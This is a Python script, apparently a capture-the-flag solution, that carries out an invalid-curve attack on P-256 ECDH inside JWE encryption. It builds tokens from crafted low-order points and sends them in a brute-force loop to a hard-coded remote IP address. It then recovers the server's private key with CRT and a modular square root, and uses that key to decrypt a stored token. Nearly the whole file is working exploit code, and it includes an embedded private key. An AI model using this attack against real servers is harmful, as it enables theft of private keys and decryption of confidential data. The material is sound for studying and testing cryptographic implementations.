"""
This is an invalid curve attack on NIST curve P256 against a server
that supports ECDH.
"""
import json
import sys
import requests
import struct

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.concatkdf import ConcatKDFHash

from mathutil import *

import vulnecc
from jwcrypto import jwk, jwe
from jwcrypto.common import json_encode, json_decode, base64url_decode, base64url_encode


def derive_key(privkey, point_x, point_y, alg, bitsize, headers):
    # OtherInfo is defined in NIST SP 56A 5.8.1.2.1

    # AlgorithmID
    otherinfo = struct.pack('>I', len(alg))
    otherinfo += bytes(alg.encode('utf8'))

    # PartyUInfo
    apu = base64url_decode(headers['apu']) if 'apu' in headers else b''
    otherinfo += struct.pack('>I', len(apu))
    otherinfo += apu

    # PartyVInfo
    apv = base64url_decode(headers['apv']) if 'apv' in headers else b''
    otherinfo += struct.pack('>I', len(apv))
    otherinfo += apv

    # SuppPubInfo
    otherinfo += struct.pack('>I', bitsize)

    # no SuppPrivInfo

    # Shared Key generation

    x, y = point_x, point_y
    P = vulnecc.AffinePoint(vulnecc.curveP256_vuln, x, y)
    s = privkey
    shared = s * P
    shared_key = int.to_bytes(shared.x, 32, "big")

    ckdf = ConcatKDFHash(
        algorithm=hashes.SHA256(),
        length=bitsize // 8,
        otherinfo=otherinfo,
        backend=default_backend()
    )
    return ckdf.derive(shared_key)


def _encode_int(n, bits):
    e = '{:x}'.format(n)
    ilen = ((bits + 7) // 8) * 2  # number of bytes rounded up times 2 bytes
    return unhexlify(e.rjust(ilen, '0')[:ilen])


def _decode_int(n):
    return int(hexlify(n), 16)


priv = {"crv":"P-256","d":"29FABiRtn3-GOQNEH3jTZj8KywLb38fHQAtfvWaXSC4","kty":"EC","size":2048,"x":"2RntSELMcr5qVFmhWZiCKS0NzkZwm3f0dwbXythHYTw","y":"wJgR6ZgJB6lVZFHF-vQ_biOfOAHuTZayzIE55cCbHEM"}
pub = {"crv":"P-256","kty":"EC","x":"2RntSELMcr5qVFmhWZiCKS0NzkZwm3f0dwbXythHYTw","y":"wJgR6ZgJB6lVZFHF-vQ_biOfOAHuTZayzIE55cCbHEM"}

# {"ciphertext":"BFNqIIeTIFFqzqhMTgqogYEME2osaAW_3uGQoOrrYYk","header":{"epk":{"crv":"P-256","kty":"EC","x":"9WZ2GQsgaEfyPEOM876DEHbDfQcI0HpOuZIYZls6osc","y":"eLP6pQjqyvM-jBkOIGTGd_1V5N0ELt6ITA2R4R-fTlY"}},"iv":"ZBlyAnsAGm_a6ITI2bjxsw","protected":"eyJhbGciOiJFQ0RILUVTIiwiZW5jIjoiQTI1NkNCQy1IUzUxMiIsImtpZCI6ImVmSDNxazFReHBtTnZxaFkzelhvU0VmZ21sOF83dW5Lb0tydm9ESWNCMWMiLCJ0eXAiOiJKV0UifQ","tag":"5PlTCduYuUqRl0USE-My_d5VvTB1k9szNERYELSL9DM"}

# order 3
invalid_curve_b = 40762520383452945195843938160544742543174561344916535813974395963913031940110
invalid_curve_point = [112699601695560561689738873491898987764801993883781788339365544038894281043223, 49551986547310344854660704331867483487413289303304394569830017282056791717415]

public_key = jwk.JWK()
public_key.import_key(**pub)

private_key = jwk.JWK()
private_key.import_key(**priv)


def craft_payload(x, y, scalar):
    payload = "My Encrypted message"
    protected_header = {
            "alg": "ECDH-ES",
            "enc": "A256CBC-HS512",
            "typ": "JWE",
            "kid": public_key.thumbprint(),
    }

    aes_key = derive_key(scalar, point_x=x, point_y=y, alg='A256CBC-HS512', bitsize=512, headers={'alg': 'ECDH-ES', 'enc': 'A256CBC-HS512', 'kid': 'efH3qk1QxpmNvqhY3zXoSEfgml8_7unKoKrvoDIcB1c', 'typ': 'JWE'})

    # print(aes_key.hex())

    jwetoken = jwe.JWE(
        payload.encode(),
        recipient=public_key,
        protected=protected_header,
        point_x=x,
        point_y=y,
        aes_key=aes_key
    )
    return jwetoken.serialize(compact=True)

SERVER_ADDR = ('localhost', 5000)
CURVE_PRECOMPUTE_FILE = 'curve_data_NIST-P256.json'
# Order of the underlying finite field
FIELD_ORDER = 115792089210356248762697446949407573530086143415290314195533631308867097853951


def load_precomute(fname):
    with open(fname) as f:
        res = json.load(f)
    return res


def main():
    points = load_precomute(CURVE_PRECOMPUTE_FILE)
    partial_keys = []
    mods = []

    for p in sorted(map(int, points)):
        order = p
        b, x, y = points[str(p)]
        print('[STAGE 1] Attempting to recover key in subgroup of order {}'.format(order))
        print('         => Worst case would be {} requests.'.format((order + 1) / 2))
        for i in range(order):
            res = requests.post("http://159.65.118.137:1234/submit", data=craft_payload(x, y, i))
            if 'success' not in res.text:
                continue
            # No exceptions or continue means we found a partial key
            print('         => **Found partial key {} MOD {}**'.format(hex(i), hex(order)))
            partial_keys.append((i*i) % order)
            mods.append(order)
            print('[STAGE 1] Found {} out of {} partial keys!'.format(len(partial_keys), len(points)))
            break
        else:
            print('[ERROR] No partial key found for mod {}. Stopping attack.'.format(order))
            sys.exit(1)

    # Found all squares, combining the congruences with CRT
    sq_key = chinese_remainder(mods, partial_keys)
    print('Square of recovered key:', sq_key)
    if legendre_symbol(sq_key, FIELD_ORDER) == 1:
        print('[STAGE 2] Squared Key is a perfect square in field over base point order!')
    else:
        print('[STAGE 2] Squared Key is NOT a perfect square in field over base point order!')
        print('[STAGE 2] Something went wrong! Sopping attack!')
        sys.exit(1)

    server_key = sqrt(sq_key, FIELD_ORDER)
    print('[STAGE 2] Found key!')
    print('*** Recovered Server Key! ***')
    print('Server Key: {}'.format(server_key))

    privkey = priv = {"crv":"P-256","d":base64url_encode(int.to_bytes(server_key, 32, 'big')),"kty":"EC","size":2048,"x":"2RntSELMcr5qVFmhWZiCKS0NzkZwm3f0dwbXythHYTw","y":"wJgR6ZgJB6lVZFHF-vQ_biOfOAHuTZayzIE55cCbHEM"}
    enc = 'eyJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiRUNESC1FUyIsImtpZCI6ImVmSDNxazFReHBtTnZxaFkzelhvU0VmZ21sOF83dW5Lb0tydm9ESWNCMWMiLCJlcGsiOnsia3R5IjoiRUMiLCJjcnYiOiJQLTI1NiIsIngiOiJhclJEa1M1UnRfWGk1N2VraUdjYlBRM1B1a21Nb3U5Y2swYmw1SzBrWDh3IiwieSI6IjhwaXFUdU1Kd3Q4WHQ4WklwSmJYOG1zVjVEM2lqRHNtcnV5MV9kNDc2aDgifX0..GOGg4Bu-sUgj2ywK2hFqUQ.fi90qNDVYlvUxHsWVtsI1jjgbO0nnt1BBslEOWyUeWGFUg2IEX2jhczdfnE1r73m.avggzq3ZmTx6Yg9eldPnvQ'
    private_key = jwk.JWK()
    private_key.import_key(**priv)
    jwetoken = jwe.JWE()
    jwetoken.deserialize(enc, key=private_key)
    print('Payload: ', jwetoken.payload)


if __name__ == '__main__':
    main()
